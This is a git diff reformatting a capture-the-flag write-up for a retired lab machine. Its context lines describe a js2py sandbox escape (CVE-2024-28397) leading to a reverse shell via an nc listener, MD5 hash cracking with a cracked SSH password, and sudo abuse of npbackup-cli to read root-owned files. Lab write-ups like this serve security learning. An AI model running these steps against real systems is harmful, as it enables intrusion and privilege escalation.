@@ -1,12 +1,13 @@
-|Property|Value|
-|---|---|
-|**OS**|Linux|
-|**Difficulty**|Easy|
-|**Release**|2025-08-16|
-|**State**|Retired|
-|**IP**|10.10.11.82|
-|**Techniques**|js2py sandbox escape, hash cracking, sudo abuse|
-|**Tags**|#web #lateralmovement #privesc #linux #python|
+
+| Property       | Value                                           |
+| -------------- | ----------------------------------------------- |
+| **OS**         | Linux                                           |
+| **Difficulty** | Easy                                            |
+| **Release**    | 2025-08-16                                      |
+| **State**      | Retired                                         |
+| **IP**         | 10.10.11.82                                     |
+| **Techniques** | js2py sandbox escape, hash cracking, sudo abuse |
+| **Tags**       | #web #lateralmovement #privesc #linux #python   |
 
 ---
 ## Summary
@@ -48,11 +49,11 @@ Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
 
 Two open ports: SSH on 22 and a Gunicorn web app on 8000.
 
-Show Image
+![](./screens/1.png)
 
 Downloading the app archive and extracting it reveals the source code and dependencies.
 
-Show Image
+![](./screens/2.png)
 
 **Vulnerable `js2py` version identified in `requirements.txt`:**
 
@@ -65,24 +66,21 @@ js2py==0.74
 `js2py` 0.74 is vulnerable to CVE-2024-28397, a sandbox escape allowing arbitrary Python execution via `subprocess.Popen`.
 
 ---
-
 ## Foothold
 
-### CVE-2024-28397 — js2py Sandbox Escape
+### CVE-2024-28397
 
 CVE-2024-28397 allows an authenticated user to escape the `js2py` JavaScript sandbox and execute arbitrary system commands by accessing `subprocess.Popen` through Python's object hierarchy.
 
 Registering an account exposes a JavaScript code editor.
 
-Show Image
+![](./screens/3.png)
 
-Show Image
+![](./screens/4.png)
 
 ### Exploitation
 
 The following payload traverses Python's class hierarchy to locate and invoke `subprocess.Popen`, executing an arbitrary shell command:
-
-javascript
 
 ```javascript
 // [+] command goes here:
@@ -120,7 +118,7 @@ Set up a listener and submit the payload through the editor:
 nc -lvnp 9001
 ```
 
-Show Image
+![](./screens/5.png)
 
 Shell obtained as `app`. Upgraded to a full interactive TTY:
 
@@ -134,13 +132,13 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 A SQLite database is found in the `instance` directory:
 
-Show Image
+![](./screens/6.png)
 
-Show Image
+![](./screens/7.png)
 
 The database contains MD5 password hashes for registered users.
 
-Show Image
+![](./screens/8.png)
 
 Saving marco's hash and cracking it with John:
 
@@ -160,9 +158,9 @@ ssh marco@codepartwo.htb
 # password: sweetangelbabylove
 ```
 
-Show Image
+![](./screens/9.png)
 
-Show Image
+![](./screens/10.png)
 
 ---
 
@@ -174,15 +172,13 @@ Show Image
 marco@codepartwo:~$ sudo -l
 ```
 
-Show Image
+![](./screens/11.png)
 
 Marco can run `npbackup-cli` as root. `npbackup` is a backup tool that reads a configuration file defining repository paths and credentials.
 
 ### Exploitation
 
 Editing `npbackup.conf` to add privileged paths to the backup target:
-
-yaml
 
 ```yaml
 paths:
@@ -197,7 +193,7 @@ Running the backup as root:
 sudo /usr/local/bin/npbackup-cli -c npbackup.conf --backup
 ```
 
-Show Image
+![](./screens/12.png)
 
 Dumping the root flag from the snapshot:
 
